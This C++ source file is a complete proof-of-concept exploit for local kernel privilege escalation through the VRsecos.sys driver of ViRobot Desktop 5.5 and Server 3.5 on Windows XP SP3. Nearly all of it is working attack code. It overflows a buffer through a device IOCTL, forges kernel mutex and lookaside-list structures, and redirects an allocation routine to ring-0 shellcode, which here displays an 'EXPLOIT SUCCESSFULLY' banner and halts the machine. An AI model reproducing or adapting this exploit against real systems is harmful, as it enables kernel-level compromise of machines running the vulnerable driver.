// virobot0day.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "windows.h"
#include "malloc.h"
typedef struct X_DISPATCHER_HEADER{
UCHAR Type ; 
UCHAR Absolute ; 
UCHAR Size ; 
UCHAR Inserted ; 
ULONG SignalState ; 
LIST_ENTRY WaitListHead ; 
}X_DISPATCHER_HEADER , *PX_DISPATCHER_HEADER;
typedef struct X_KMUTANT{
X_DISPATCHER_HEADER Header ; 
LIST_ENTRY MutantListEntry ; 
PVOID OwnerThread ; 
UCHAR Abandoned ; 
UCHAR ApcDisable ; 
}X_KMUTANT , *PX_KMUTANT;
PVOID GetInfoTable(ULONG ATableType)
{
ULONG mSize = 0x4000;
PVOID mPtr = NULL;
LONG status;
HMODULE hlib = GetModuleHandle("ntdll.dll");
PVOID pZwQuerySystemInformation = GetProcAddress(hlib , "ZwQuerySystemInformation");

do
{
mPtr = malloc(mSize);
if (mPtr)
{
__asm
{
push 0
push mSize
push mPtr
push ATableType
call pZwQuerySystemInformation
mov status , eax
}
}
else
{
return NULL;
}
if (status == 0xc0000004)
{
free(mPtr);
mSize = mSize * 2;
}
} while (status == 0xc0000004);
if (status == 0)
{
return mPtr;
}
free(mPtr);
return NULL;
}
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Information[ 1 ];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
enum { SystemModuleInformation = 11,
SystemHandleInformation = 16 };
typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT Index;
    USHORT NameLength;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef VOID (WINAPI *PINBV_ACQUIRE_DISPLAY_OWNERSHIP)(VOID);
typedef BOOLEAN (WINAPI *PINBV_RESET_DISPLAY)(VOID);
typedef VOID (WINAPI *PINBV_SOLID_COLOR_FILL)(
  ULONG x1,
  ULONG y1,
  ULONG x2,
  ULONG y2,
  ULONG color
    );
typedef ULONG (WINAPI *PINBV_SET_TEXT_COLOR)(
  ULONG Color
    );
typedef
VOID
(*INBV_DISPLAY_STRING_FILTER)(
  PUCHAR *Str
    );
typedef VOID (WINAPI *PINBV_INSTALL_DISPLAY_STRING_FILTER)(
    INBV_DISPLAY_STRING_FILTER DisplayStringFilter
    );
typedef BOOLEAN (WINAPI *PINBV_ENABLE_DISPLAY_STRING)(
    BOOLEAN bEnable
    );
typedef VOID (WINAPI *PINVB_SET_SCROLL_REGION)(
    ULONG x1,
    ULONG y1,
    ULONG x2,
    ULONG y2
    );
typedef VOID (WINAPI *PINBV_DISPLAY_STRING)(
    PUCHAR Str
    );
PINBV_ACQUIRE_DISPLAY_OWNERSHIP InbvAcquireDisplayOwnership = 0 ; 
PINBV_RESET_DISPLAY InbvResetDisplay = 0 ; 
PINBV_SOLID_COLOR_FILL InbvSolidColorFill = 0 ; 
PINBV_SET_TEXT_COLOR InbvSetTextColor = 0 ; 
PINBV_INSTALL_DISPLAY_STRING_FILTER InbvInstallDisplayStringFilter = 0 ; 
PINBV_ENABLE_DISPLAY_STRING InbvEnableDisplayString = 0 ; 
PINVB_SET_SCROLL_REGION InbvSetScrollRegion = 0 ; 
PINBV_DISPLAY_STRING InbvDisplayString= 0 ; 
#define VGA_COLOR_BLACK 0
#define VGA_COLOR_RED 1
#define VGA_COLOR_GREEN 2
#define VGA_COLOR_GR 3
#define VGA_COLOR_BULE 4
#define VGA_COLOR_DARK_MEGAENTA 5
#define VGA_COLOR_TURQUOISE 6
#define VGA_COLOR_GRAY 7
#define VGA_COLOR_BRIGHT_GRAY 8
#define VGA_COLOR_BRIGHT_RED 9
#define VGA_COLOR_BRIGHT_GREEN 10
#define VGA_COLOR_BRIGHT_YELLOW 11
#define VGA_COLOR_BRIGHT_BULE 12
#define VGA_COLOR_BRIGHT_PURPLE 13
#define VGA_COLOR_BRIGHT_TURQUOISE 14
#define VGA_COLOR_WHITE 15
UCHAR DisplayString[] = 
"                                                                                "

"                                                                                "

"                                                                                "

"                ---- ===== EXPLOIT SUCCESSFULLY ==== ----                       "

"                                                                                "

"                                                                                "

" ViRobot Desktop 5.5 & ViRobot Server 3.5 Local Privilege Escalation Exploit    "

"                                                                                "

" VULNERABLE PRODUCT                                                             "

"                                                                                "

" ViRobot Desktop 5.5 and below                                                  "

" ViRobot Server 3.5 and below                                                   "

"                                                                                "

" VULERABLE FILE                                                                 "

" VRsecos.sys <= 2008.8.1.1                                                      "

"                                                                                "

" AUTHOR                                                                         "

"                                                                                "

" MJ0011                                                                         "

" th_decoder$126.com                                                             "

"                                                                                "

" 2010-8-22                                                                      "

"                                                                                "

"                                                                                "

"                                                                                ";

VOID InbvShellCode()
{
//DISABLE INTERRUPT
__asm
{
cli
}
//RESET TO VGA MODE
InbvAcquireDisplayOwnership();
InbvResetDisplay();
//FILL FULL SCREEN
InbvSolidColorFill(0 , 0 , 639 , 479 ,VGA_COLOR_BLACK);
//SET TEXT COLOR
InbvSetTextColor(VGA_COLOR_BRIGHT_GREEN);
InbvInstallDisplayStringFilter(NULL);
InbvEnableDisplayString(TRUE);
InbvSetScrollRegion( 0 , 0 , 639 ,477);
InbvDisplayString(DisplayString);
while(TRUE)
{
};
}
BOOL InbvInit(PVOID ntosbase , PSTR ntosname)
{
HMODULE hlib = LoadLibrary(ntosname);
if (hlib == NULL)
{
return FALSE ; 
}
InbvAcquireDisplayOwnership = (PINBV_ACQUIRE_DISPLAY_OWNERSHIP)((ULONG)GetProcAddress(hlib , "InbvAcquireDisplayOwnership") - (ULONG)hlib + (ULONG)ntosbase);

InbvResetDisplay = (PINBV_RESET_DISPLAY)((ULONG)GetProcAddress(hlib , "InbvResetDisplay") - (ULONG)hlib + (ULONG)ntosbase);

InbvSolidColorFill = (PINBV_SOLID_COLOR_FILL)((ULONG)GetProcAddress(hlib , "InbvSolidColorFill") - (ULONG)hlib + (ULONG)ntosbase);

InbvSetTextColor = (PINBV_SET_TEXT_COLOR)((ULONG)GetProcAddress(hlib , "InbvSetTextColor") - (ULONG)hlib + (ULONG)ntosbase);

InbvInstallDisplayStringFilter = (PINBV_INSTALL_DISPLAY_STRING_FILTER)((ULONG)GetProcAddress(hlib , "InbvInstallDisplayStringFilter") - (ULONG)hlib + (ULONG)ntosbase);

InbvEnableDisplayString = (PINBV_ENABLE_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvEnableDisplayString") - (ULONG)hlib + (ULONG)ntosbase);

InbvSetScrollRegion = (PINVB_SET_SCROLL_REGION)((ULONG)GetProcAddress(hlib , "InbvSetScrollRegion") - (ULONG)hlib + (ULONG)ntosbase);

InbvDisplayString = (PINBV_DISPLAY_STRING)((ULONG)GetProcAddress(hlib , "InbvDisplayString") - (ULONG)hlib + (ULONG)ntosbase);

if (InbvAcquireDisplayOwnership &&
InbvResetDisplay &&
InbvSolidColorFill &&
InbvSetTextColor &&
InbvInstallDisplayStringFilter &&
InbvEnableDisplayString &&
InbvSetScrollRegion &&
InbvDisplayString)
{
return TRUE ; 
}
return FALSE ; 
}
int main(int argc, char* argv[])
{
printf("ViRotbot Desktop 5.5 & ViRobot Server 3.5 vrsecos.sys <= 2008.8.1.1\n"
"Local Kernel Mode Privilege Escalation Vulnerability POC\n\n"
"This Exploit Code Only for vrsecos == 2008.8.1.1\n"
"Test On Windows XP SP3\n\n"
"By MJ0011 th_decoder$126.com\n\n"
"Press Enter\n");
getchar();
HANDLE hDev = CreateFile("\\\\.\\VRsecos" , FILE_READ_ATTRIBUTES , FILE_SHARE_READ , 0 , OPEN_EXISTING , 0 , 0 );

if (hDev == INVALID_HANDLE_VALUE)
{
printf("cannot open device....%u\n" , GetLastError());
//return 0;
}
//data for IoControlCode = 8307202C , buffer overrun
PVOID pdata = malloc(0x2000);
//fill non-zero data
memset(pdata , 0x20 , 0x2000);
//process mutx ...
PX_KMUTANT pmutant = (PX_KMUTANT)((ULONG)pdata + 0x858 + 200);
HANDLE hthread = OpenThread(THREAD_ALL_ACCESS , FALSE , GetCurrentThreadId());
PSYSTEM_HANDLE_INFORMATION phi = (PSYSTEM_HANDLE_INFORMATION)GetInfoTable(SystemHandleInformation);

PSYSTEM_MODULE_INFORMATION pmi = (PSYSTEM_MODULE_INFORMATION)GetInfoTable(SystemModuleInformation);

//get base address of vrsecos.sys
PVOID vrsecosbase = 0 ; 
ULONG i ;
for (i = 0 ; i < pmi->Count ; i ++)
{
if (stricmp((PCHAR)(pmi->Module[i].ImageName + strlen(pmi->Module[i].ImageName ) - strlen("vrsecos.sys")) ,

"vrsecos.sys") == 0 )
{
vrsecosbase = pmi->Module[i].Base;
break ; 
}
}
if (vrsecosbase == 0 )
{
printf("cannot find vrsecos....\n");
//return 0 ; 
}
if (!InbvInit(pmi->Module[0].Base , strrchr(pmi->Module[0].ImageName , '\\')+1))
{
printf("cannot init inbv system\n");
return 0 ;
}
//get thread object
PVOID MyThreadOBJ = NULL ;
for (i = 0 ;  i < phi->NumberOfHandles ; i ++)
{
if (phi->Information[i].HandleValue == (USHORT)hthread &&
phi->Information[i].UniqueProcessId == (USHORT)GetCurrentProcessId())
{
MyThreadOBJ = phi->Information[i].Object;
break ; 
}
}
if (MyThreadOBJ == NULL)
{
printf("cannot find my thread object\n");
return 0 ;
}
//for KeWaitForSignleObject
//KeWaitForSignleObject will check SignalState
pmutant->Header.SignalState = 0x30303030;
pmutant->MutantListEntry.Flink = (PLIST_ENTRY)((ULONG)vrsecosbase + 0x2db0 ); 
pmutant->MutantListEntry.Blink = (PLIST_ENTRY)((ULONG)vrsecosbase + 0x2db0) ; 
//for KeReleaseMutex , Mutant 's owner thread must be our thread when KeReleaseMutex

pmutant->OwnerThread = MyThreadOBJ; 
//for IOCTL CODE 0x83072014
//spec NPAGED_LOOKASIDE_LIST List
//
// user address space 
PVOID pAlloc = VirtualAlloc((PVOID)0x0A0A0A0A , 0x1000 , MEM_RESERVE|MEM_COMMIT , PAGE_READWRITE);

if (pAlloc == NULL)
{
printf("cannot allocate spec addr %u\n! ", GetLastError());
return 0 ; 
}
*(DWORD*)0x0a0a0101 = 0 ; 
// vrsecos+2d68 < vrsecos+2d64
// and vrsecos+2d68 < 0
*(DWORD*)((ULONG)pdata + 0x81c +200) = 0xc1c1c1c1 ; 
*(DWORD*)((ULONG)pdata + 0x820 + 200) = 0xc0c0c0c0 ;
//fill NPAGED_LOOKASIDE_LIST
*(DWORD*)((ULONG)pdata + 0xdd8 + 200) = 0x0a0a0101;
*(DWORD*)((ULONG)pdata + 0xddc +200 ) = 0x01010101 ;
//fill NPAGE_LOOKASIDE_LIST->AllocateRoutine
//is our R0 Shell Code !!!
*(DWORD*)((ULONG)pdata + 0xdd8 + 0x28 +200 ) = (DWORD)InbvShellCode;
ULONG btr ; 
ULONG temp;
//memory overflow!!
if (!DeviceIoControl(hDev , 0x8307202c , pdata , 0x1000 , NULL , 0 , &btr , NULL ))

{
printf("dev ctl 1 failed %u\n", GetLastError());
return 0 ; 
}
PVOID pdata2 = malloc(0x6d4);
*(DWORD*)pdata2 = 1; 
*(ULONG*)((ULONG)pdata2 + 8 ) = 0 ; 
strcpy((PCHAR)((ULONG)pdata2 + 264) , "exploit you !");
strcpy((PCHAR)((ULONG)pdata2 + 464) , "exploit you !!");
//first time , NPAGED_LOOKASIDE_LIST got ZERO !!
if (!DeviceIoControl(hDev , 0x83072014 , pdata2 , 1748 , &temp , 4 , &btr , 0 ))
{
printf("dev ctrl 2 failed %u\n", GetLastError());
return 0 ; 
}
//second time , go NPAGED_LOOKASIDE_LIST->AllocateRoutine!!
if (!DeviceIoControl(hDev , 0x83072014 , pdata2 , 1748 , &temp , 4 , &btr , 0 ))
{
printf("dev ctrl 2 failed %u\n", GetLastError());
return 0 ; 
}
return 0 ; 
}


      